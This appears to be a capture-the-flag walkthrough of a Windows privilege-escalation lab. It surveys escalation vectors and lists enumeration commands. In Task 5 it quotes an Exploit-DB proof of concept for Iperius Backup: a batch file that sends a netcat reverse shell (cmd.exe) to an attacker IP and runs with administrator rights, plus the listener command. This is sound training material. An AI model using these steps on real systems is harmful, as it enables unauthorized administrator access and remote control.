# Windows PrivEscalation

### Windows Account types!

- Domain Administrators: (Highest rank) Manage all accounts of the organization.
	- A "domain" is a central registry used to manage all users and computers within the organization.
- Services: Accounts used by software to perform their tasks such as back-ups or antivirus scans.
- Domain users: Accounts typically used by employees.
- Local accounts: These accounts are only valid on the local system and can not be used over the domain.

### Windows Privilege Escalation Vectors

- Stored Credentials: Important credentials can be saved in files by the user or in the configuration file of an application installed on the target system.
- Windows Kernel Exploit: The Windows operating system installed on the target system can have a known vulnerability that can be exploited to increase privilege levels.
- Insecure File/Folder Permissions: In some situations, even a low privileged user can have read or write privileges over files and folders that can contain sensitive information.
- Insecure Service Permissions: Similar to permissions over sensitive files and folders, low privileged users may have rights over services.
- DLL Hijacking: Applications use DLL files to support their execution. Sometimes DLLs that are deleted or not present on the system are called by the application (the application can still run).
	- Finding a DLL the application is looking for in a location we can write to can help us create a malicious DLL file that will be run by the application.
	- In such a case, the malicious DLL will run with the main application's privilege level. 
- Unquoted Service Path: If the executable path of a service contains a space and is not enclosed within quotes, a hacker could introduce their own malicious executables to run instead of the intended executable.
- Always Install Elevated: Windows applications can be installed using Windows Installer (also known as MSI packages) files.
	- These files make the installation process easy and straightforward.
	- Windows systems can be configured with the "AlwaysInstallElevated" policy. This allows the installation process to run with administrator privileges without requiring the user to have these privileges.
	- This feature allows users to install software that may need higher privileges without having this privilege level. If "AlwaysInstallElevated" is configured, a malicious executable packaged as an MSI file could be run to obtain a higher privilege level.
- Other software: Software, applications, or scripts installed on the target machine may also provide privilege escalation vectors.

### Initial Information Gathering

- ```net users```
	- list users on the target system

- ```systeminfo```
	- Get information about the operating system!
- ```wmic service list```
	- list services installed on the target system!


## Task 1

```
net users
```

![****](/Advent%20of%20Cyber%203/Screenshots/Task13/q1.png)

## Task 2

```systeminfo```

![****](/Advent%20of%20Cyber%203/Screenshots/Task13/q1.png)

## Task 3 & 4

![****](/Advent%20of%20Cyber%203/Screenshots/Task13/q3.png)

## Task 5

#### Enumerating Iperius Service!

![****](/Advent%20of%20Cyber%203/Screenshots/Task13/q5-1.png)

Quick search on google of any common exploit! we found!

https://www.exploit-db.com/exploits/46863

```
Exploit:
1. Login as low privilege user where Iperius Backup and Iperius Backup Service are installed

2. Download netcat  from attacking machine
	 c:\users\low\downloads\nc.exe
	 
3. Create batch file calling netcat and sending command prompt to attacking machine
	c:\users\low\desktop\evil.bat
		@echo off
		c:\users\low\downloads\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
	nc -nlvvp 443

5. Open Iperius Backup and create new backup job
	- set any folder to backup (c:\temp)
	- set to any destination (c:\users\low\desktop)
	- set program to run before backup job (c:\users\low\desktop\evil.bat)

6. Right-click on newly created job and select "Run backup service as"
	- will either be local system or administrator account

7. Command prompt on attacking machine will appear
	C:\Program Files (x86)\Iperius Backup>whoami
	whoami
	<computer name>\<administrator>
```

Let follow the guide! to escalate out privs!

![****](/Advent%20of%20Cyber%203/Screenshots/Task13/q5-2.png)

![****](/Advent%20of%20Cyber%203/Screenshots/Task13/q5-3.png)

![****](/Advent%20of%20Cyber%203/Screenshots/Task13/q5-4.png)

![****](/Advent%20of%20Cyber%203/Screenshots/Task13/q5-5.png)

![****](/Advent%20of%20Cyber%203/Screenshots/Task13/q5-6.png)

## Task 6

```
C:\Users\thegrinch\Documents
```

![****](/Advent%20of%20Cyber%203/Screenshots/Task13/q6.png)

Have a great day!